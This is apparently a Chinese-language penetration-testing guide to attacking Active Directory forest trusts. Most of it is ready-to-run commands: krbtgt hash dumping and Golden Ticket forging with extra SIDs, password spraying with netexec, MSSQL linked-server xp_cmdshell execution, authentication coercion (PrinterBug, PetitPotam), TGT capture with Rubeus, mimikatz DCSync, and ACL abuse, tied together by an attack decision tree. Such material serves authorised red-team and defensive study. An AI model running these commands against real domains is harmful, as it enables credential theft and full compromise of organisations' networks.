# 跨林攻击详解

## 概述

森林信任默认启用 ForestSpecific SID Filtering，阻止直接注入 Enterprise Admins 等高权限 SID。但仍存在多种可行的跨林攻击路径: SID History (受限)、外部组成员、密码重用、MSSQL Links、非约束委派、ACL 滥用。

---

## SID 过滤机制

### 过滤规则

| 类别 | 是否通过 | 示例 |
|------|---------|------|
| 知名 SID (RID < 1000) | 被过滤 | -500 Administrator, -512 DA, -519 EA |
| 自定义组 (RID > 1000) | 可通过 | -1111 CustomGroup, -2001 ProjectTeam |
| 源林自身 SID | 可通过 | 源林内部用户/组的 SID |

### 检查 SID 过滤状态

```powershell
Get-ADTrust -Filter * | Select Name, SIDFilteringForestAware, SIDFilteringQuarantined
netdom trust <DOMAIN> /d:<TARGET_FOREST> /enableSIDHistory
```

---

## 方法一: Golden Ticket + SID History

**前提**: 源林 krbtgt + 目标林中 RID > 1000 的有价值组。

```powershell
# 枚举目标林中 RID > 1000 的组
Get-DomainGroup -Domain <TARGET_FOREST> |
  Where-Object {($_.objectsid -split '-')[-1] -gt 1000} |
  Select name, objectsid, description
```

```bash
# 获取源林 krbtgt
secretsdump.py -just-dc-user '<SOURCE_DOMAIN>/krbtgt' \
  '<SOURCE_DOMAIN>/Administrator:<PASSWORD>@<SOURCE_DC>'

# 创建 Golden Ticket (注入目标组 SID, RID > 1000)
ticketer.py -nthash <KRBTGT_HASH> \
  -domain-sid '<SOURCE_SID>' \
  -domain <SOURCE_DOMAIN> \
  -extra-sid 'S-1-5-21-<TARGET_SID>-1111' \
  fakeuser

export KRB5CCNAME=fakeuser.ccache
smbclient.py -k -no-pass <TARGET_DOMAIN>/fakeuser@<TARGET_DC>
```

---

## 方法二: 外部组成员枚举与利用

目标林可能已授权源林用户/组访问其资源。

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_FOREST>
Get-DomainForeignUser -Domain <TARGET_FOREST>
```

```cypher
-- BloodHound 跨域成员关系
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE u.domain <> g.domain
RETURN u.name, g.name, g.domain
```

```bash
# 获取已授权用户凭据后直接访问目标林
netexec smb <TARGET_DC> -u 'svc_backup' -p '<PASSWORD>' -d '<SOURCE_DOMAIN>'
```

---

## 方法三: 密码重用跨域测试

```bash
netexec smb <TARGET_DC> -u '<USER>' -p '<PASSWORD>' -d '<TARGET_FOREST>'
netexec smb <TARGET_DC> -u users.txt -p passwords.txt -d '<TARGET_FOREST>'
netexec smb <TARGET_DC> -u '<USER>' -H '<NTHASH>' -d '<TARGET_FOREST>'
```

高价值账户优先:

```
├─ 1. 服务账户 (svc_*, service_*) ── 跨林共用概率高
├─ 2. 管理员账户 (admin*, adm_*) ── 管理员常用相同密码
├─ 3. 应用账户 (app_*, sql_*) ── 配置可能跨林相同
└─ 4. DA/EA 成员 ── 高价值目标
```

---

## 方法四: MSSQL Linked Server

```sql
SELECT * FROM master..sysservers;                                         -- 枚举链接
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];                           -- 链接执行
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [SECOND_LINK]') AT [FIRST_LINK]; -- 链式穿越
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];                       -- 命令执行
```

```powershell
# PowerUpSQL 自动化
Get-SQLServerLinkCrawl -Instance <SQL_SERVER> -Verbose
Get-SQLServerLinkCrawl -Instance <SQL_SERVER> -Query "EXEC xp_cmdshell 'whoami'"
```

---

## 方法五: 非约束委派跨域

源林非约束委派服务器可捕获目标林 DC 的 TGT。

```
流程: 找到非约束委派 → 强制目标 DC 认证 → 捕获 TGT → DCSync
```

```powershell
# 查找非约束委派
Get-DomainComputer -Unconstrained -Domain <SOURCE_DOMAIN>

# 监听入站 TGT
Rubeus.exe monitor /interval:5 /nowrap /filteruser:<TARGET_DC>$
```

```bash
# 强制认证 (PrinterBug / PetitPotam / DFSCoerce)
SpoolSample.exe <TARGET_DC> <UNCONSTRAINED_SERVER>
PetitPotam.py <UNCONSTRAINED_SERVER> <TARGET_DC>
```

```powershell
# 使用捕获的 TGT
Rubeus.exe ptt /ticket:<CAPTURED_TGT_BASE64>
mimikatz lsadump::dcsync /domain:<TARGET_FOREST> /user:<TARGET_FOREST>\krbtgt
```

---

## 方法六: 跨信任 ACL 滥用

```powershell
Get-DomainObjectAcl -Domain <TARGET_FOREST> -ResolveGUIDs |
  Where-Object {$_.SecurityIdentifier -match 'S-1-5-21-<SOURCE_SID>'}
```

| 可利用权限 | 利用方式 |
|-----------|----------|
| GenericAll | 重置密码 / 修改组成员 |
| WriteDacl | 授予自身 GenericAll |
| WriteOwner | 设为所有者后修改 DACL |
| ForceChangePassword | 直接重置密码 |

---

## 攻击路径决策

```
[跨林攻击] 森林信任 + SID 过滤
    │
    ├─ 有源林 krbtgt + 目标存在 RID>1000 有价值组?
    │   └─ 是 ── Golden Ticket + SID History
    │
    ├─ 存在外部组成员?
    │   └─ 是 ── 获取成员凭据 → 利用已有授权
    │
    ├─ 密码重用?
    │   └─ 是 ── 直接登录目标林
    │
    ├─ MSSQL 链接?
    │   └─ 是 ── 链式 xp_cmdshell
    │
    ├─ 非约束委派?
    │   └─ 是 ── 强制认证 → 捕获 TGT
    │
    └─ 跨林 ACL?
        └─ 是 ── ACL 滥用
```

---

## 关键限制

- **RID < 1000 必被过滤**: EA(-519)、DA(-512) 等无法通过森林信任
- **SID History 默认禁用**: 需管理员显式启用 (`netdom trust /enableSIDHistory:yes`)
- **信任方向决定攻击方向**: Inbound = 对方信任我们 (我们可访问对方)
